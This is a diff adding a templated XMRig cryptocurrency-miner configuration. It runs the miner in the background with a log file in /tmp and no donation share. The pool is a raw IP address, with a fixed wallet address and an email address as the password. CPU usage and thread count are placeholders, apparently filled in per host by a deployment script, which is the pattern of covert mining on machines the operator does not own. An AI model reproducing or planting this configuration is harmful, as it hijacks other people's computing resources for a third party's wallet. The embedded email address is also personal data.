@@ -1,0 +1,32 @@
+{
+    "algo": "ALGO",
+    "av": 2,
+    "background": true,
+    "colors": true,
+    "cpu-affinity": null,
+    "cpu-priority": null,
+    "donate-level": 0,
+    "log-file": "/tmp/xmrig.log",
+    "max-cpu-usage": CPU_USAGE,
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "syslog": false,
+    "threads": THREADS,
+    "pools": [
+        {
+            "url": "153.92.5.45",
+            "user": "43soZ8ZBysaBABuXeY6g9U3xqt7WJzFCnHMFEnHsiS67KKFL65nD9J7jfrr6fWiKBVceDc6fEM5pyeHk6e5podMr4WZnYrR",
+            "pass": "Streak868@gmail.com",
+            "keepalive": true,
+            "nicehash": false,
+            "variant": -1
+        }
+    ],
+    "api": {
+        "port": 5555,
+        "access-token": null,
+        "worker-id": null
+    }
+}
